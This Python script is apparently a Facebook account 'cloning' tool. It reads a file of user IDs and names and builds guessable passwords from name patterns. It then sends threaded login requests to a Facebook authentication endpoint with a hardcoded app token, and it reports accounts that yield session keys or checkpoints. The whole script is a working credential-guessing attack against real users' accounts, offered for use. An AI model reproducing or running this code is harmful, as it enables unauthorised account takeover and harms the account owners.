#!/usr/bin/python3
#coding=utf-8
import time,requests,os,json,random
from rich.progress import track
from time import sleep
from rich import panel
from concurrent.futures import ThreadPoolExecutor as tpe
from rich import progress
import sys

G='\x1b[1;92m'
R='\x1b[1;91m'
W='\x1b[1;97m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
yp ='\x1b[1;95m'
mys = '\x1b[0m'



loop = 0

idx = []


logo ="""


     oooo     oooo        ooooooo8       oooo   oooo 
      8888o   888       o888    88        8888o  88  
      88 888o8 88       888    oooo       88 888o88  
      88  888  88       888o    88        88   8888  
     o88o  8  o88o       888ooo888       o88o  o888o  
                                                     
---------------------------------------------------
 Author : Rana Aahil
 Github : Private/Persnol
 Admin  : Mergan
---------------------------------------------------
"""
                                               
                                               
                                               






def rana_():
    os.system("clear")
    print(logo)
    print(" [1] File Cloning")
    print(" [0] Exit \n")
    har_ = input(" select: ")
    if har_=="1":
        file_c()
    elif har_=="0":
        exit("exit")
    else:
        print(" Enter valid option ");time.sleep(2)
        rana_()

def file_c():
    os.system("clear")
    print(logo)
    try:
        file = input(" Enter File: ")
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(" file location error ")
        time.sleep(2)
        rana_()
    cloning_two()
    exit()



def cloning_two():
    oku = []
    twof = []
    cpu = []
    pp = []
    os.system("clear")
    print(logo)
    print(" [1] Auto Password")
    print(" [2] Choice Passwords")
    print(" [B] Back \n")
    clon_ = input(" select an option: ")
    if clon_ == "1":
        pas = ["firstlast","first last","firstlast123","first12","firstlast1234","firstlast12345"]
        for px in pas:
            pp.append(px)
        pass
    elif clon_ == "2":
        os.system("clear")
        print(logo)
        lp = input(' How many passwords you want to add: ')
        print("\n")
        if lp.isnumeric():
            print(" Example : [ firstlast first last first123 ] \n")
            for x in range(int(lp)):
                pp.append(input(f' Password {x+1}: '))
            pass
        else:
            print(" enter only numbers ")
            exit()
    elif clon_ == "B":
        rana_()
    else:
        exit(" please enter valid option ")
    #methond_genrator
    os.system("clear")
    print(logo)
    print("  Make this sure you have fast internet")
    print("  Process has been started be Patient ")
    print("----------------------------------------------")
    fax = ('|')
    def rana(user):
        global loop,idx
        ses = requests.Session()
        uid, name = user.split("|")
        first=name.rsplit(' ')[0]
        try:
            last=name.rsplit(' ')[1]
        except:
            first=last
        for px in ((pp)):
            px = px.replace("first", first).replace("last", last)
            px = px.lower()
            #print(px)
            ua = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9")
            head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(px)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
            xo = resp.content
            if "session_key" in str(xo):
                print(Y+"\r  [RSA-OK] "+uid+" | "+px)
            elif "www.facebook.com" in str(xo):
                print(G+"\r  [RSA-CP] "+uid+" | "+px)
                cpu.append(uid)
        sys.stdout.write("\r {} {}/{} ".format(mys, str(loop), str(len(idx))))
        sys.stdout.flush()
        loop += 1
    with tpe(max_workers=30) as tp:
        tp.map(rana, idx)
    print("\n----------------------------------------------")
    print(" cloning finshed ..")
    exit()




rana_()